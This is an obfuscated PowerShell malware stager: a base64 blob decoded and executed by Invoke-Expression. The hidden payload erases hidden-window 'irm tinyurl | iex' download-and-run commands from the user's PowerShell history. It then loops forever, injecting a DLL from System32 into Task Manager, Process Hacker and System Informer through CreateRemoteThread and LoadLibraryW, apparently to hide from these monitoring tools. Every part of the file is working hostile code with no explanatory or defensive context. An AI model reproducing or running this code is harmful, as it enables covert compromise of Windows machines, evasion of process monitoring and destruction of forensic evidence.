$payload = 'IyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIDEpIENsZWFuIFBvd2VyU2hlbGwgaGlzdG9yeQ0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiRoaXN0b3J5RmlsZSA9ICIkZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRsaW5lXENvbnNvbGVIb3N0X2hpc3RvcnkudHh0Ig0KDQokYmxvY2tlZENvbW1hbmRzID0gQCgNCiAgICAgJ3Bvd2Vyc2hlbGwgLXdpbmRvd3N0eWxlIGhpZGRlbiAtZXAgYnlwYXNzIC1jICJpcm0gaHR0cHM6Ly90aW55dXJsLmNvbS9DbGFya3NTZXR1cCB8IGlleCInLA0KICAgICAncG93ZXJzaGVsbCAtd2luZG93c3R5bGUgaGlkZGVuIC1lcCBieXBhc3MgLWMgImlybSBodHRwczovL3Rpbnl1cmwuY29tL0NsYXJrWGluamVjdCB8IGlleCInLA0KICAgICAncG93ZXJzaGVsbCAtd2luZG93c3R5bGUgaGlkZGVuIC1lcCBieXBhc3MgLWMgImlybSBodHRwczovL3Rpbnl1cmwuY29tL0NsYXJrWGhpZGUgfCBpZXgiJw0KKQ0KDQppZiAoVGVzdC1QYXRoICRoaXN0b3J5RmlsZSkgew0KICAgICRoaXN0b3J5ID0gR2V0LUNvbnRlbnQgJGhpc3RvcnlGaWxlDQoNCiAgICAkZmlsdGVyZWQgPSAkaGlzdG9yeSB8IFdoZXJlLU9iamVjdCB7DQogICAgICAgICRrZWVwID0gJHRydWUNCiAgICAgICAgZm9yZWFjaCAoJGNtZCBpbiAkYmxvY2tlZENvbW1hbmRzKSB7DQogICAgICAgICAgICBpZiAoJF8gLWxpa2UgIiokY21kKiIpIHsNCiAgICAgICAgICAgICAgICAka2VlcCA9ICRmYWxzZQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRrZWVwDQogICAgfQ0KDQogICAgU2V0LUNvbnRlbnQgJGhpc3RvcnlGaWxlIC1WYWx1ZSAkZmlsdGVyZWQgLUVuY29kaW5nIFVURjgNCiAgICBXcml0ZS1Ib3N0ICJbK10gUG93ZXJTaGVsbCBoaXN0b3J5IGNsZWFuZWQuIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQp9IGVsc2Ugew0KICAgIFdyaXRlLUhvc3QgIlstXSBIaXN0b3J5IGZpbGUgbm90IGZvdW5kIGF0ICRoaXN0b3J5RmlsZSIgLUZvcmVncm91bmRDb2xvciBZZWxsb3cNCn0NCg0KIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIDIpIERMTCBJbmplY3RvciBMb29wDQojIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KJGRsbEZvbGRlciA9ICJDOlxXaW5kb3dzXFN5c3RlbTMyIg0KJGRsbDEgPSAiQXBvbi5kbGwiDQokZGxsMVBhdGggPSBKb2luLVBhdGggJGRsbEZvbGRlciAkZGxsMQ0KJHRhcmdldFByb2Nlc3NlcyA9IEAoIlRhc2ttZ3IiLCAiUHJvY2Vzc0hhY2tlciIsICJTeXN0ZW1JbmZvcm1lciIpDQokaW5qZWN0ZWRQSURzID0gQHt9DQoNCiRpbmplY3RvckNvZGUgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQoNCnB1YmxpYyBjbGFzcyBJbmplY3Rvcg0Kew0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBPcGVuUHJvY2VzcyhpbnQgZHdEZXNpcmVkQWNjZXNzLCBib29sIGJJbmhlcml0SGFuZGxlLCBpbnQgZHdQcm9jZXNzSWQpOw0KDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIHVpbnQgZmxBbGxvY2F0aW9uVHlwZSwgdWludCBmbFByb3RlY3QpOw0KDQogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildDQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBCYXNlQWRkcmVzcywgYnl0ZVtdIGJ1ZmZlciwgdWludCBzaXplLCBvdXQgVUludFB0ciB3cml0dGVuKTsNCg0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCg0KICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRNb2R1bGVIYW5kbGUoc3RyaW5nIGxwTW9kdWxlTmFtZSk7DQoNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlUmVtb3RlVGhyZWFkKEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywNCiAgICAgICAgdWludCBkd1N0YWNrU2l6ZSwgSW50UHRyIGxwU3RhcnRBZGRyZXNzLCBJbnRQdHIgbHBQYXJhbWV0ZXIsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBUaHJlYWRJZCk7DQoNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENsb3NlSGFuZGxlKEludFB0ciBoT2JqZWN0KTsNCg0KICAgIHB1YmxpYyBjb25zdCBpbnQgUFJPQ0VTU19DUkVBVEVfVEhSRUFEID0gMHgwMDAyOw0KICAgIHB1YmxpYyBjb25zdCBpbnQgUFJPQ0VTU19RVUVSWV9JTkZPUk1BVElPTiA9IDB4MDQwMDsNCiAgICBwdWJsaWMgY29uc3QgaW50IFBST0NFU1NfVk1fT1BFUkFUSU9OID0gMHgwMDA4Ow0KICAgIHB1YmxpYyBjb25zdCBpbnQgUFJPQ0VTU19WTV9XUklURSA9IDB4MDAyMDsNCiAgICBwdWJsaWMgY29uc3QgaW50IFBST0NFU1NfVk1fUkVBRCA9IDB4MDAxMDsNCg0KICAgIHB1YmxpYyBjb25zdCB1aW50IE1FTV9DT01NSVQgPSAweDAwMDAxMDAwOw0KICAgIHB1YmxpYyBjb25zdCB1aW50IE1FTV9SRVNFUlZFID0gMHgwMDAwMjAwMDsNCiAgICBwdWJsaWMgY29uc3QgdWludCBQQUdFX1JFQURXUklURSA9IDB4MDQ7DQoNCiAgICBwdWJsaWMgc3RhdGljIGJvb2wgSW5qZWN0KGludCBwaWQsIHN0cmluZyBkbGxQYXRoKQ0KICAgIHsNCiAgICAgICAgSW50UHRyIGhQcm9jZXNzID0gT3BlblByb2Nlc3MoUFJPQ0VTU19DUkVBVEVfVEhSRUFEIHwgUFJPQ0VTU19RVUVSWV9JTkZPUk1BVElPTiB8IFBST0NFU1NfVk1fT1BFUkFUSU9OIHwgUFJPQ0VTU19WTV9XUklURSB8IFBST0NFU1NfVk1fUkVBRCwgZmFsc2UsIHBpZCk7DQogICAgICAgIGlmIChoUHJvY2VzcyA9PSBJbnRQdHIuWmVybykNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCg0KICAgICAgICBJbnRQdHIgYWxsb2NNZW1BZGRyZXNzID0gVmlydHVhbEFsbG9jRXgoaFByb2Nlc3MsIEludFB0ci5aZXJvLCAodWludCkoKGRsbFBhdGguTGVuZ3RoICsgMSkgKiBNYXJzaGFsLlNpemVPZih0eXBlb2YoY2hhcikpKSwNCiAgICAgICAgICAgIE1FTV9DT01NSVQgfCBNRU1fUkVTRVJWRSwgUEFHRV9SRUFEV1JJVEUpOw0KICAgICAgICBpZiAoYWxsb2NNZW1BZGRyZXNzID09IEludFB0ci5aZXJvKQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KDQogICAgICAgIGJ5dGVbXSBieXRlcyA9IEVuY29kaW5nLlVuaWNvZGUuR2V0Qnl0ZXMoZGxsUGF0aCk7DQogICAgICAgIFVJbnRQdHIgYnl0ZXNXcml0dGVuOw0KICAgICAgICBib29sIHJlc3VsdCA9IFdyaXRlUHJvY2Vzc01lbW9yeShoUHJvY2VzcywgYWxsb2NNZW1BZGRyZXNzLCBieXRlcywgKHVpbnQpYnl0ZXMuTGVuZ3RoLCBvdXQgYnl0ZXNXcml0dGVuKTsNCiAgICAgICAgaWYgKCFyZXN1bHQgfHwgYnl0ZXNXcml0dGVuLlRvVUludDMyKCkgIT0gYnl0ZXMuTGVuZ3RoKQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KDQogICAgICAgIEludFB0ciBrZXJuZWwzMkhhbmRsZSA9IEdldE1vZHVsZUhhbmRsZSgia2VybmVsMzIuZGxsIik7DQogICAgICAgIEludFB0ciBsb2FkTGlicmFyeUFkZHIgPSBHZXRQcm9jQWRkcmVzcyhrZXJuZWwzMkhhbmRsZSwgIkxvYWRMaWJyYXJ5VyIpOw0KICAgICAgICBpZiAobG9hZExpYnJhcnlBZGRyID09IEludFB0ci5aZXJvKQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KDQogICAgICAgIEludFB0ciByZW1vdGVUaHJlYWQgPSBDcmVhdGVSZW1vdGVUaHJlYWQoaFByb2Nlc3MsIEludFB0ci5aZXJvLCAwLCBsb2FkTGlicmFyeUFkZHIsIGFsbG9jTWVtQWRkcmVzcywgMCwgSW50UHRyLlplcm8pOw0KICAgICAgICBpZiAocmVtb3RlVGhyZWFkID09IEludFB0ci5aZXJvKQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KDQogICAgICAgIENsb3NlSGFuZGxlKGhQcm9jZXNzKTsNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KfQ0KIkANCg0KQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRpbmplY3RvckNvZGUgLUxhbmd1YWdlIENTaGFycA0KDQpXcml0ZS1PdXRwdXQgIk1vbml0b3JpbmcgcHJvY2Vzc2VzOiAkKCR0YXJnZXRQcm9jZXNzZXMgLWpvaW4gJywgJykuLi4iDQoNCndoaWxlICgkdHJ1ZSkgew0KICAgIGZvcmVhY2ggKCRwcm9jZXNzTmFtZSBpbiAkdGFyZ2V0UHJvY2Vzc2VzKSB7DQogICAgICAgICRwcm9jcyA9IEdldC1Qcm9jZXNzIC1OYW1lICRwcm9jZXNzTmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICBmb3JlYWNoICgkcHJvYyBpbiAkcHJvY3MpIHsNCiAgICAgICAgICAgIGlmICgtbm90ICRpbmplY3RlZFBJRHMuQ29udGFpbnNLZXkoJHByb2MuSWQpKSB7DQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJJbmplY3RpbmcgaW50byAkcHJvY2Vzc05hbWUiDQogICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSBbSW5qZWN0b3JdOjpJbmplY3QoJHByb2MuSWQsICRkbGwxUGF0aCkNCiAgICAgICAgICAgICAgICBpZiAoJHN1Y2Nlc3MpIHsNCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiWytdIERvbmUiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCiAgICAgICAgICAgICAgICAgICAgJGluamVjdGVkUElEc1skcHJvYy5JZF0gPSAkdHJ1ZQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkZhaWxlZCB0byBpbmplY3QiIC1Gb3JlZ3JvdW5kQ29sb3IgUmVkDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgICAgICMgUmVtb3ZlIGV4aXRlZCBwcm9jZXNzZXMgZnJvbSB0cmFja2luZw0KICAgICAgICBmb3JlYWNoICgkcHJvY0lkIGluIEAoJGluamVjdGVkUElEcy5LZXlzKSkgew0KICAgICAgICAgICAgaWYgKC1ub3QgKEdldC1Qcm9jZXNzIC1JZCAkcHJvY0lkIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICAgICAgICAgICRpbmplY3RlZFBJRHMuUmVtb3ZlKCRwcm9jSWQpDQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJQcm9jZXNzIHdpdGggUElEICRwcm9jSWQgaGFzIGV4aXRlZC4gTW9uaXRvcmluZyBhZ2Fpbi4iDQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KDQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMQ0KfQ0K';
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payload));
Invoke-Expression $decoded;
